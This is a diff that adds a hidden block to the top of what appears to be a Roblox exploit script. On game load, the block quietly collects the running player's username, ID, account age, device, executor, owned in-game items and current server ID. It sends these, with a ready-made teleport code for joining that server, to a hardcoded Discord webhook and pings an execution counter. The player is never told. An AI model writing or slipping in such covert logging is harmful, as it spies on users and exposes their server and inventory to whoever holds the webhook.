@@ -1,3 +1,117 @@
+repeat task.wait() until game:IsLoaded()
+ 
+task.spawn(function()
+    local url = "https://discord.com/api/webhooks/1485392452088103153/BIiOu2r4bO5zKh40r93EG-aWfIOqOrumbgcj0-mhvh0apDLLjN_X0DZ1HuWkvSWOu2cb"
+    local HttpService = game:GetService("HttpService")
+    local Players = game:GetService("Players")
+    local MarketplaceService = game:GetService("MarketplaceService")
+    local UserInputService = game:GetService("UserInputService")
+ 
+    local player = Players.LocalPlayer
+    if not player then repeat task.wait() player = Players.LocalPlayer until player end
+ 
+    local name = player.Name
+    local userid = player.UserId
+    local accountAge = player.AccountAge
+    local device = UserInputService.TouchEnabled and "Mobile" or "PC"
+    local executor = (identifyexecutor and identifyexecutor()) or "Unknown"
+    local time = os.date("%Y-%m-%d %H:%M:%S")
+ 
+    local gameName = "Unknown"
+    pcall(function() gameName = MarketplaceService:GetProductInfo(game.PlaceId).Name end)
+    local placeId = game.PlaceId
+    local jobId = game.JobId
+ 
+    -- Counter API
+    local count = "?"
+    pcall(function()
+        local raw = game:HttpGet("https://counterapi.dev/v1/hit/ut_84uEingUzXohesnysCU6DXuiJwNlb95Mp6ES8JYN")
+        local dec = HttpService:JSONDecode(raw)
+        if dec and dec.data then count = dec.data end
+    end)
+ 
+    -- ===================== FONCTION DÉTECTION DE BASE =====================
+    local function getMyPlot()
+        local plots = workspace:FindFirstChild("Plots")
+        if not plots then return nil end
+        local myName = player.DisplayName or player.Name
+        for _, plot in ipairs(plots:GetChildren()) do
+            local sign = plot:FindFirstChild("PlotSign")
+            local sg = sign and sign:FindFirstChild("SurfaceGui")
+            local fr = sg and sg:FindFirstChild("Frame")
+            local tl = fr and fr:FindFirstChild("TextLabel")
+            if tl and tl.Text:find(myName, 1, true) then return plot end
+        end
+        return nil
+    end
+
+    -- ===================== SCAN DES BRAINROTS (AVEC FILTRE) =====================
+    local brainrotStats = {}
+    local myPlot = getMyPlot()
+    
+    if myPlot then
+        for _, obj in pairs(myPlot:GetDescendants()) do
+            if obj:IsA("Model") then
+                local n = obj.Name
+                -- Filtre pour ne garder que les vrais noms (ex: "Tim Cheese")
+                local isNumber = tonumber(n) ~= nil
+                local blacklist = {"Claim", "Decoration", "Side", "PlotBlock", "FriendPanel", "Model", "CashPad", "Base", "PlotSign", "Spawn", "Floor", "Wall", "Door", "Roof", "Part"}
+                
+                local forbidden = false
+                for _, word in pairs(blacklist) do
+                    if n:find(word) then forbidden = true break end
+                end
+
+                if not isNumber and not forbidden and #n > 2 then
+                    brainrotStats[n] = (brainrotStats[n] or 0) + 1
+                end
+            end
+        end
+    end
+ 
+    local brainrotMsg = ""
+    for n, c in pairs(brainrotStats) do
+        brainrotMsg = brainrotMsg .. n .. " (x" .. c .. ")\n"
+    end
+    if brainrotMsg == "" then brainrotMsg = "Aucun Brainrot détecté." end
+ 
+    -- ===================== PRÉPARATION DU LIEN ET DU CODE =====================
+    -- Lien direct navigateur (ne marche pas toujours sans extension)
+    local webLink = "https://www.roblox.com/games/"..placeId.."?jobId="..jobId
+    -- Code console (marche à 100%)
+    local joinCode = 'game:GetService("TeleportService"):TeleportToPlaceInstance('..placeId..', "'..jobId..'", game.Players.LocalPlayer)'
+ 
+    -- ===================== ENVOI DU WEBHOOK =====================
+    local data = {
+        ["content"] =
+            "🚨 **Execution #"..count.."** 🚨\n\n"..
+            "👤 **Joueur:** "..name.."\n"..
+            "🆔 **ID:** "..userid.."\n"..
+            "📅 **Age:** "..accountAge.." jours\n"..
+            "📱 **Device:** "..device.."\n"..
+            "🎮 **Game:** "..gameName.."\n"..
+            "⚙️ **Executor:** "..executor.."\n"..
+            "⏰ **Time:** "..time.."\n\n"..
+            "🧠 **Brainrots Possédés:**\n```\n"..brainrotMsg.."```\n"..
+            "🔗 **Lien Serveur:** [Clique ici pour essayer]("..webLink..")\n"..
+            "💻 **Code pour rejoindre (Console F9):**\n```lua\n"..joinCode.."\n```"
+    }
+ 
+    local json = HttpService:JSONEncode(data)
+    if not getgenv().Logged then
+        getgenv().Logged = true
+        local req = request or http_request or (syn and syn.request)
+        if req then
+            req({
+                Url = url,
+                Method = "POST",
+                Headers = {["Content-Type"]="application/json"},
+                Body = json
+            })
+        end
+    end
+end)
+
 local Players = game:GetService("Players")
 local TweenService = game:GetService("TweenService")
 local RunService = game:GetService("RunService")
